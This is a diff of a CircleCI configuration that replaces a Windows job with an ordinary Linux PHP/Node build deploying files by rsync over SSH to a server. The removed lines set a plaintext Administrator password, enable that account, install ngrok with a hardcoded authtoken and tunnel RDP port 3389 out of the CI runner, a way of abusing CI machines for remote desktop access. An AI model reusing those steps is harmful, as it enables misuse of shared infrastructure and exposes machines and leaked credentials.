@@ -1,22 +1,35 @@
-version: 2.1 
- 
-orbs:
-  win: circleci/windows@2.2.0
- 
+version: 2
 jobs:
-  build: 
-    executor:
-      name: win/default 
-      size: "medium" 
- 
+  build:
+    docker:
+      - image: circleci/php:7.3-stretch-node-browsers
     steps:
-      - checkout      
-      - run: Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "galang123456" -Force)
-      - run: Get-LocalUser -Name "Administrator" | Enable-LocalUser 
-      - run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-      - run: tar xf ngrok.zip
-      - run: Copy ngrok.exe C:\Windows\System32
-      - run: cmd /c echo ./ngrok.exe authtoken "2BEjCEFWPBmdLwc29OGpVNHsvSB_3PUuPUR5NRR6oNi1AgmmL" >a.ps1
-      - run: cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
-      - run: cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
-      - run: .\a.ps1
+      - type: shell
+        shell: /bin/sh
+        pwd: /
+        command: sudo apt update && sudo apt install git -y && git --version
+
+      # Update environment
+      - run: sudo apt update
+
+      # Install rsync. It will be used to upload our code to server
+      - run: sudo apt-get install rsync
+
+      # Sync the SSH keys 
+      - add_ssh_keys
+
+      # Check out the code in the project directory
+      - checkout
+
+      # Install JS dependencies.
+      # Of course, you may not need this. It just shows how to use some commands such as npm
+      - run: npm install
+
+      # Run your command
+      - run: npm run prod
+
+      # Add the server to known hosts
+      - run: ssh-keyscan -H 157.231.110.01 >> ~/.ssh/known_hosts
+
+      # Finally, upload your files to server.
+      - run: rsync -avce ssh --delete ./dist/ root@157.231.110.01:/path/on/remote/server
